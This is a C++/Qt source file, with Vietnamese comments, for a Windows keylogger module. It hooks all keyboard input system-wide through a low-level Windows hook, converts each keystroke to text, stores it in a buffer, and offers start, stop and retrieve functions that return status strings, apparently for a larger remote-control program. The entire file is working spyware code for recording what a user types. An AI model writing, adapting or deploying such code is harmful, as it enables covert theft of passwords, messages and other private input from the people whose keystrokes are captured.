#include "KeyloggerModule.h"

#include <QDebug>
#include <QDateTime>

#ifdef Q_OS_WIN
#include <Windows.h>
#endif

#ifdef Q_OS_WIN
KeyloggerModule* KeyloggerModule::instance = nullptr;
void* KeyloggerModule::hookHandle = nullptr;
#endif


KeyloggerModule::KeyloggerModule(QObject *parent)
    : QObject(parent), running(false)
{
#ifdef Q_OS_WIN
    instance = this;
#endif
}

KeyloggerModule::~KeyloggerModule()
{
    if (running)
    {
        stopKeylogger();
    }
}


//---------------------------------------------------
// Windows Keyboard Hook Callback
//---------------------------------------------------

#ifdef Q_OS_WIN
long __stdcall KeyloggerModule::keyboardProc(int nCode,
                                              unsigned long long wParam,
                                              long long lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;

        QString keyText;

        // Map virtual key code to readable string
        switch (vkCode)
        {
        case VK_RETURN:   keyText = "[ENTER]"; break;
        case VK_SPACE:    keyText = " "; break;
        case VK_BACK:     keyText = "[BACKSPACE]"; break;
        case VK_TAB:      keyText = "[TAB]"; break;
        case VK_ESCAPE:   keyText = "[ESC]"; break;
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:   keyText = "[SHIFT]"; break;
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: keyText = "[CTRL]"; break;
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:    keyText = "[ALT]"; break;
        case VK_CAPITAL:  keyText = "[CAPS]"; break;
        case VK_DELETE:   keyText = "[DEL]"; break;
        case VK_LEFT:     keyText = "[LEFT]"; break;
        case VK_RIGHT:    keyText = "[RIGHT]"; break;
        case VK_UP:       keyText = "[UP]"; break;
        case VK_DOWN:     keyText = "[DOWN]"; break;
        default:
        {
            // Chuyển đổi virtual key thành ký tự
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);

            WCHAR buffer[4];
            int result = ToUnicode(vkCode, kbStruct->scanCode,
                                   keyboardState, buffer, 4, 0);
            if (result > 0)
            {
                keyText = QString::fromWCharArray(buffer, result);
            }
            else
            {
                keyText = "[VK:" + QString::number(vkCode) + "]";
            }
            break;
        }
        }

        if (instance && !keyText.isEmpty())
        {
            QMutexLocker locker(&instance->mutex);
            instance->keyBuffer.append(keyText);
        }
    }

    return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
}
#endif


//---------------------------------------------------
// Bắt đầu ghi phím
//---------------------------------------------------

QString KeyloggerModule::startKeylogger()
{
    if (running)
    {
        return "FAIL: Keylogger already running";
    }

#ifdef Q_OS_WIN
    hookHandle = (void*)SetWindowsHookEx(WH_KEYBOARD_LL,
                                          (HOOKPROC)keyboardProc,
                                          GetModuleHandle(NULL),
                                          0);
    if (hookHandle == nullptr)
    {
        qDebug() << "Failed to set keyboard hook!";
        return "FAIL: Cannot set keyboard hook";
    }

    running = true;
    keyBuffer.clear();

    qDebug() << "Keylogger started.";
    return "SUCCESS";
#else
    return "FAIL: Only supported on Windows";
#endif
}


//---------------------------------------------------
// Dừng ghi phím
//---------------------------------------------------

QString KeyloggerModule::stopKeylogger()
{
    if (!running)
    {
        return "FAIL: Keylogger not running";
    }

#ifdef Q_OS_WIN
    if (hookHandle)
    {
        UnhookWindowsHookEx((HHOOK)hookHandle);
        hookHandle = nullptr;
    }
#endif

    running = false;

    qDebug() << "Keylogger stopped.";
    return "SUCCESS";
}


//---------------------------------------------------
// Lấy dữ liệu đã ghi
//---------------------------------------------------

QString KeyloggerModule::getKeyloggerData()
{
    QMutexLocker locker(&mutex);

    if (keyBuffer.isEmpty())
    {
        return "(No keys recorded)";
    }

    QString data = keyBuffer.join("");
    return data;
}


//---------------------------------------------------
// Kiểm tra trạng thái
//---------------------------------------------------

bool KeyloggerModule::isRunning() const
{
    return running;
}
